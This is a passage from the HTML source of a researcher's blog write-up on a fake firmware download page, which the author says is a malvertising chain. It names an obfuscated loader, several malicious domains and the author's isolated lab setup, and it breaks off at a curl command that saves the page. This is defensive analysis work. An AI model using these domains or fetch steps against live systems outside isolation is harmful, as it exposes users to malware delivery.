@@ -1,0 +1,1254 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head><title>MalvertiseWriteup | Cybersecurity Researcher</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted Grotesk:wght@400;700&amp;family=Source Sans Pro:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Gabriel Adams – Portfolio"/><meta property="og:title" content="MalvertiseWriteup | Cybersecurity Researcher"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="MalvertiseWriteup | Cybersecurity Researcher"/><meta name="twitter:description" content="Comprehensive technical write-up — investigation of gofirmware.com/downloads/pxie-8880-firmware Author: Gabriel Adams Date: 2025-09-27 Scope: Static analysis of a suspiciouswebsite."/><meta property="og:description" content="Comprehensive technical write-up — investigation of gofirmware.com/downloads/pxie-8880-firmware Author: Gabriel Adams Date: 2025-09-27 Scope: Static analysis of a suspiciouswebsite."/><meta property="og:image:alt" content="Comprehensive technical write-up — investigation of gofirmware.com/downloads/pxie-8880-firmware Author: Gabriel Adams Date: 2025-09-27 Scope: Static analysis of a suspiciouswebsite."/><meta property="og:image" content="https://https://gradams42.github.io/static/og-image.png"/><meta property="og:image:url" content="https://https://gradams42.github.io/static/og-image.png"/><meta name="twitter:image" content="https://https://gradams42.github.io/static/og-image.png"/><meta property="og:image:type" content="image/.png"/><meta property="twitter:domain" content="https://gradams42.github.io"/><meta property="og:url" content="https://https//gradams42.github.io/MalvertiseWriteup"/><meta property="twitter:url" content="https://https//gradams42.github.io/MalvertiseWriteup"/><link rel="icon" href="./static/icon.png"/><meta name="description" content="Comprehensive technical write-up — investigation of gofirmware.com/downloads/pxie-8880-firmware Author: Gabriel Adams Date: 2025-09-27 Scope: Static analysis of a suspiciouswebsite."/><meta name="generator" content="Quartz"/><link href="./index.css" rel="stylesheet" type="text/css" spa-preserve/><style>.expand-button {
+  position: absolute;
+  display: flex;
+  float: right;
+  padding: 0.4rem;
+  margin: 0.3rem;
+  right: 0;
+  color: var(--gray);
+  border-color: var(--dark);
+  background-color: var(--light);
+  border: 1px solid;
+  border-radius: 5px;
+  opacity: 0;
+  transition: 0.2s;
+}
+.expand-button > svg {
+  fill: var(--light);
+  filter: contrast(0.3);
+}
+.expand-button:hover {
+  cursor: pointer;
+  border-color: var(--secondary);
+}
+.expand-button:focus {
+  outline: 0;
+}
+
+pre:hover > .expand-button {
+  opacity: 1;
+  transition: 0.2s;
+}
+
+#mermaid-container {
+  position: fixed;
+  contain: layout;
+  z-index: 999;
+  left: 0;
+  top: 0;
+  width: 100vw;
+  height: 100vh;
+  overflow: hidden;
+  display: none;
+  backdrop-filter: blur(4px);
+  background: rgba(0, 0, 0, 0.5);
+}
+#mermaid-container.active {
+  display: inline-block;
+}
+#mermaid-container > #mermaid-space {
+  border: 1px solid var(--lightgray);
+  background-color: var(--light);
+  border-radius: 5px;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  height: 80vh;
+  width: 80vw;
+  overflow: hidden;
+}
+#mermaid-container > #mermaid-space > .mermaid-content {
+  padding: 2rem;
+  position: relative;
+  transform-origin: 0 0;
+  transition: transform 0.1s ease;
+  overflow: visible;
+  min-height: 200px;
+  min-width: 200px;
+}
+#mermaid-container > #mermaid-space > .mermaid-content pre {
+  margin: 0;
+  border: none;
+}
+#mermaid-container > #mermaid-space > .mermaid-content svg {
+  max-width: none;
+  height: auto;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls {
+  position: absolute;
+  bottom: 20px;
+  right: 20px;
+  display: flex;
+  gap: 8px;
+  padding: 8px;
+  background: var(--light);
+  border: 1px solid var(--lightgray);
+  border-radius: 6px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+  z-index: 2;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+  padding: 0;
+  border: 1px solid var(--lightgray);
+  background: var(--light);
+  color: var(--dark);
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  font-family: var(--bodyFont);
+  transition: all 0.2s ease;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:hover {
+  background: var(--lightgray);
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:active {
+  transform: translateY(1px);
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:nth-child(2) {
+  width: auto;
+  padding: 0 12px;
+  font-size: 14px;
+}
+/*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VSb290IjoiL2hvbWUvZ3JhZGFtcy9Eb2N1bWVudHMvVXBkYXRpbmdXZWJzaXRlL2dyYWRhbXM0Mi5naXRodWIuaW8vcXVhcnR6L2NvbXBvbmVudHMvc3R5bGVzIiwic291cmNlcyI6WyJtZXJtYWlkLmlubGluZS5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBOztBQUdGO0VBQ0U7RUFDQTs7QUFHRjtFQUNFOzs7QUFLRjtFQUNFO0VBQ0E7OztBQUlKO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFOztBQUdGO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFO0VBQ0E7O0FBR0Y7RUFDRTtFQUNBOztBQUlKO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTs7QUFHRjtFQUNFOztBQUlGO0VBQ0U7RUFDQTtFQUNBIiwic291cmNlc0NvbnRlbnQiOlsiLmV4cGFuZC1idXR0b24ge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIGZsb2F0OiByaWdodDtcbiAgcGFkZGluZzogMC40cmVtO1xuICBtYXJnaW46IDAuM3JlbTtcbiAgcmlnaHQ6IDA7IC8vIE5PVEU6IHJpZ2h0IHdpbGwgYmUgc2V0IGluIG1lcm1haWQuaW5saW5lLnRzXG4gIGNvbG9yOiB2YXIoLS1ncmF5KTtcbiAgYm9yZGVyLWNvbG9yOiB2YXIoLS1kYXJrKTtcbiAgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tbGlnaHQpO1xuICBib3JkZXI6IDFweCBzb2xpZDtcbiAgYm9yZGVyLXJhZGl1czogNXB4O1xuICBvcGFjaXR5OiAwO1xuICB0cmFuc2l0aW9uOiAwLjJzO1xuXG4gICYgPiBzdmcge1xuICAgIGZpbGw6IHZhcigtLWxpZ2h0KTtcbiAgICBmaWx0ZXI6IGNvbnRyYXN0KDAuMyk7XG4gIH1cblxuICAmOmhvdmVyIHtcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgYm9yZGVyLWNvbG9yOiB2YXIoLS1zZWNvbmRhcnkpO1xuICB9XG5cbiAgJjpmb2N1cyB7XG4gICAgb3V0bGluZTogMDtcbiAgfVxufVxuXG5wcmUge1xuICAmOmhvdmVyID4gLmV4cGFuZC1idXR0b24ge1xuICAgIG9wYWNpdHk6IDE7XG4gICAgdHJhbnNpdGlvbjogMC4ycztcbiAgfVxufVxuXG4jbWVybWFpZC1jb250YWluZXIge1xuICBwb3NpdGlvbjogZml4ZWQ7XG4gIGNvbnRhaW46IGxheW91dDtcbiAgei1pbmRleDogOTk5O1xuICBsZWZ0OiAwO1xuICB0b3A6IDA7XG4gIHdpZHRoOiAxMDB2dztcbiAgaGVpZ2h0OiAxMDB2aDtcbiAgb3ZlcmZsb3c6IGhpZGRlbjtcbiAgZGlzcGxheTogbm9uZTtcbiAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDRweCk7XG4gIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC41KTtcblxuICAmLmFjdGl2ZSB7XG4gICAgZGlzcGxheTogaW5saW5lLWJsb2NrO1xuICB9XG5cbiAgJiA+ICNtZXJtYWlkLXNwYWNlIHtcbiAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgIGJhY2tncm91bmQtY29sb3I6IHZhcigtLWxpZ2h0KTtcbiAgICBib3JkZXItcmFkaXVzOiA1cHg7XG4gICAgcG9zaXRpb246IGZpeGVkO1xuICAgIHRvcDogNTAlO1xuICAgIGxlZnQ6IDUwJTtcbiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTtcbiAgICBoZWlnaHQ6IDgwdmg7XG4gICAgd2lkdGg6IDgwdnc7XG4gICAgb3ZlcmZsb3c6IGhpZGRlbjtcblxuICAgICYgPiAubWVybWFpZC1jb250ZW50IHtcbiAgICAgIHBhZGRpbmc6IDJyZW07XG4gICAgICBwb3NpdGlvbjogcmVsYXRpdmU7XG4gICAgICB0cmFuc2Zvcm0tb3JpZ2luOiAwIDA7XG4gICAgICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4xcyBlYXNlO1xuICAgICAgb3ZlcmZsb3c6IHZpc2libGU7XG4gICAgICBtaW4taGVpZ2h0OiAyMDBweDtcbiAgICAgIG1pbi13aWR0aDogMjAwcHg7XG5cbiAgICAgIHByZSB7XG4gICAgICAgIG1hcmdpbjogMDtcbiAgICAgICAgYm9yZGVyOiBub25lO1xuICAgICAgfVxuXG4gICAgICBzdmcge1xuICAgICAgICBtYXgtd2lkdGg6IG5vbmU7XG4gICAgICAgIGhlaWdodDogYXV0bztcbiAgICAgIH1cbiAgICB9XG5cbiAgICAmID4gLm1lcm1haWQtY29udHJvbHMge1xuICAgICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgICAgYm90dG9tOiAyMHB4O1xuICAgICAgcmlnaHQ6IDIwcHg7XG4gICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgZ2FwOiA4cHg7XG4gICAgICBwYWRkaW5nOiA4cHg7XG4gICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1saWdodCk7XG4gICAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgICAgYm9yZGVyLXJhZGl1czogNnB4O1xuICAgICAgYm94LXNoYWRvdzogMCAycHggNHB4IHJnYmEoMCwgMCwgMCwgMC4xKTtcbiAgICAgIHotaW5kZXg6IDI7XG5cbiAgICAgIC5tZXJtYWlkLWNvbnRyb2wtYnV0dG9uIHtcbiAgICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgICAgIHdpZHRoOiAzMnB4O1xuICAgICAgICBoZWlnaHQ6IDMycHg7XG4gICAgICAgIHBhZGRpbmc6IDA7XG4gICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWxpZ2h0Z3JheSk7XG4gICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWxpZ2h0KTtcbiAgICAgICAgY29sb3I6IHZhcigtLWRhcmspO1xuICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7XG4gICAgICAgIGN1cnNvcjogcG9pbnRlcjtcbiAgICAgICAgZm9udC1zaXplOiAxNnB4O1xuICAgICAgICBmb250LWZhbWlseTogdmFyKC0tYm9keUZvbnQpO1xuICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlO1xuXG4gICAgICAgICY6aG92ZXIge1xuICAgICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWxpZ2h0Z3JheSk7XG4gICAgICAgIH1cblxuICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDFweCk7XG4gICAgICAgIH1cblxuICAgICAgICAvLyBTdHlsZSB0aGUgcmVzZXQgYnV0dG9uIGRpZmZlcmVudGx5XG4gICAgICAgICY6bnRoLWNoaWxkKDIpIHtcbiAgICAgICAgICB3aWR0aDogYXV0bztcbiAgICAgICAgICBwYWRkaW5nOiAwIDEycHg7XG4gICAgICAgICAgZm9udC1zaXplOiAxNHB4O1xuICAgICAgICB9XG4gICAgICB9XG4gICAgfVxuICB9XG59XG4iXX0= */</style><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" spa-preserve/><script src="./prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("./static/contentIndex.json").then(data => data.json())</script><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://https://gradams42.github.io/index.xml"/></head><body data-slug="MalvertiseWriteup"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"><h2 class="page-title"><a href=".">Gabriel Adams – Portfolio</a></h2><div class="spacer mobile-only"></div><div class="flex-component" style="flex-direction: row; flex-wrap: nowrap; gap: 1rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button"><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg><p>Search</p></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div class="search-layout" data-preview="true"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="readermode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="readerIcon" fill="currentColor" stroke="currentColor" stroke-width="0.2" stroke-linecap="round" stroke-linejoin="round" width="64px" height="64px" viewBox="0 0 24 24" aria-label="Reader mode"><title>Reader mode</title><g transform="translate(-1.8, -1.8) scale(1.15, 1.2)"><path d="M8.9891247,2.5 C10.1384702,2.5 11.2209868,2.96705384 12.0049645,3.76669482 C12.7883914,2.96705384 13.8709081,2.5 15.0202536,2.5 L18.7549359,2.5 C19.1691495,2.5 19.5049359,2.83578644 19.5049359,3.25 L19.5046891,4.004 L21.2546891,4.00457396 C21.6343849,4.00457396 21.9481801,4.28672784 21.9978425,4.6528034 L22.0046891,4.75457396 L22.0046891,20.25 C22.0046891,20.6296958 21.7225353,20.943491 21.3564597,20.9931534 L21.2546891,21 L2.75468914,21 C2.37499337,21 2.06119817,20.7178461 2.01153575,20.3517706 L2.00468914,20.25 L2.00468914,4.75457396 C2.00468914,4.37487819 2.28684302,4.061083 2.65291858,4.01142057 L2.75468914,4.00457396 L4.50368914,4.004 L4.50444233,3.25 C4.50444233,2.87030423 4.78659621,2.55650904 5.15267177,2.50684662 L5.25444233,2.5 L8.9891247,2.5 Z M4.50368914,5.504 L3.50468914,5.504 L3.50468914,19.5 L10.9478955,19.4998273 C10.4513189,18.9207296 9.73864328,18.5588115 8.96709342,18.5065584 L8.77307039,18.5 L5.25444233,18.5 C4.87474657,18.5 4.56095137,18.2178461 4.51128895,17.8517706 L4.50444233,17.75 L4.50368914,5.504 Z M19.5049359,17.75 C19.5049359,18.1642136 19.1691495,18.5 18.7549359,18.5 L15.2363079,18.5 C14.3910149,18.5 13.5994408,18.8724714 13.0614828,19.4998273 L20.5046891,19.5 L20.5046891,5.504 L19.5046891,5.504 L19.5049359,17.75 Z M18.0059359,3.999 L15.0202536,4 L14.8259077,4.00692283 C13.9889509,4.06666544 13.2254227,4.50975805 12.7549359,5.212 L12.7549359,17.777 L12.7782651,17.7601316 C13.4923805,17.2719483 14.3447024,17 15.2363079,17 L18.0059359,16.999 L18.0056891,4.798 L18.0033792,4.75457396 L18.0056891,4.71 L18.0059359,3.999 Z M8.9891247,4 L6.00368914,3.999 L6.00599909,4.75457396 L6.00599909,4.75457396 L6.00368914,4.783 L6.00368914,16.999 L8.77307039,17 C9.57551536,17 10.3461406,17.2202781 11.0128313,17.6202194 L11.2536891,17.776 L11.2536891,5.211 C10.8200889,4.56369974 10.1361548,4.13636104 9.37521067,4.02745763 L9.18347055,4.00692283 L8.9891247,4 Z"></path></g></svg></button></div></div><div class="explorer" data-behavior="link" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a,b)=>!a.isFolder&amp;&amp;!b.isFolder||a.isFolder&amp;&amp;b.isFolder?a.displayName.localeCompare(b.displayName,void 0,{numeric:!0,sensitivity:\&quot;base\&quot;}):!a.isFolder&amp;&amp;b.isFolder?1:-1&quot;,&quot;filterFn&quot;:&quot;node=>node.slugSegment!==\&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;node=>node&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-0"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-0" class="explorer-content" aria-expanded="false" role="group"><ul class="explorer-ul overflow" id="list-0"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#"></a></li></template><template id="template-folder"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="./">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>MalvertiseWriteup</a></div></nav><h1 class="article-title">MalvertiseWriteup</h1><p show-comma="true" class="content-meta"><time datetime="2025-09-27T07:04:41.000Z">Sep 27, 2025</time><span>17 min read</span></p></div></div><article class="popover-hint"><h1 id="comprehensive-technical-write-up--investigation-of-httpsgofirmwarecomdownloadspxie-8880-firmware">Comprehensive technical write-up — investigation of <code>https://gofirmware.com/downloads/pxie-8880-firmware</code><a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#comprehensive-technical-write-up--investigation-of-httpsgofirmwarecomdownloadspxie-8880-firmware" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<p><strong>Author:</strong> Gabriel Adams
+<strong>Date:</strong> 2025-09-27
+<strong>Scope:</strong> Static analysis of a suspiciouswebsite.</p>
+<h1 id="executive-summary">Executive summary<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#executive-summary" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<p>I investigated <code>https://gofirmware.com/downloads/pxie-8880-firmware</code> and determined it is not a firmware distribution page but a malvertising / adware delivery chain. The page serves an HTML “loading” stub that immediately runs client-side redirect logic and injects an obfuscated external loader (<code>mw.min.js</code>) from <code>hoksomuptak.net</code>. That loader fingerprints the browser (using modern high-entropy APIs), appends that data to redirect/fetch URLs, and contacts multiple obscure domains (<code>zdzhk.com</code>, <code>kbvcd.com</code>, <code>my.rtmark.net</code>, <code>dulotadtor.com</code>, <code>abunownon.com</code>, <code>dawac.com</code>) to pull staged resources (not firmware binaries). Importantly, some routing decisions occur server-side (host identified as <code>ak.inazumarillom.com</code>), so visitors may see different behavior based on platform, IP, referrer, or fingerprint data. The flow is consistent with drive-by malvertising/push-subscription abuse and not legitimate firmware delivery.</p>
+<h1 id="detailed-findings">Detailed findings<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#detailed-findings" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<h2 id="1--what-i-started-with">1 — What I started with<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1--what-i-started-with" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>
+<p><strong>Target URL:</strong> <code>https://gofirmware.com/downloads/pxie-8880-firmware</code></p>
+</li>
+<li>
+<p><strong>Goal:</strong> Determine what runs when someone clicks the download link and whether it led to malicious behavior.</p>
+</li>
+</ul>
+<p><img src="./Pasted-image-20250927004838.png" width="auto" height="auto" alt/></p>
+<h2 id="2--environment-and-safety-posture">2 — Environment and safety posture<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2--environment-and-safety-posture" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>I knew there was a possibility of malicious code execution so I did all analysis in a new Ubuntu 25.x.x VM, on a VLAN sectioned off from the rest of my personal network, running an updated browser.</li>
+</ul>
+<h2 id="3--commands-i-ran">3 — Commands I ran<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3--commands-i-ran" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>I used <code>curl</code> to fetch headers and page content, and to download the external script, then used Node.js scripts for static deobfuscation.</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Save page source and capture verbose trace (safe; does not execute JS)</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -v</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -L</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --max-redirs</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 20</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;https://gofirmware.com/downloads/pxie-8880-firmware&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> gofirmware_page.html</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> 2></span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> curl_trace.txt</span></span>
+<span data-line> </span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Inspecting headers quickly</span></span>
